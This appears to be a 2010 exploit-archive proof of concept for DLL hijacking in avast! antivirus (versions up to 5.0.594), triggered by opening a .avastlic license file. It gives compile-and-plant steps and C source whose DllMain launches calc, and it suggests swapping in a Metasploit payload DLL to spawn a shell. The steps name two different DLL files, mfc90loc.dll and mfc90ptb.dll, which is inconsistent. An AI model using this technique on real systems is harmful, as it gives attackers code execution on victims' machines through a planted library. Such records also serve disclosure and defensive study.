# Exploit Title: avast! license files DLL Hijacking Exploit (mfc90loc.dll)
# Date: 25/08/2010
# Author: Bruno Filipe (diwr) http://digitalacropolis.us
# Software Link: http://www.avast.com
# Version: <= 5.0.594
# Tested on: WinXP SP2, WinXP SP3
# Thx TheLeader ;)
#
----------------------------------------------------------------------------------------------------------
# This should work with avast license files (.avastlic)
# 1. gcc dllmain.c -o mfc90loc.dll
# 2. Put mfc90ptb.dll in the same directory of an avast license file (EG:
anything.avastlic)
# 3. You can generate a msfpayload DLL and spawn a shell, for example.
#
----------------------------------------------------------------------------------------------------------

#include <windows.h>

int main()
{
  WinExec("calc", SW_NORMAL);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  main();
  return 0;
}
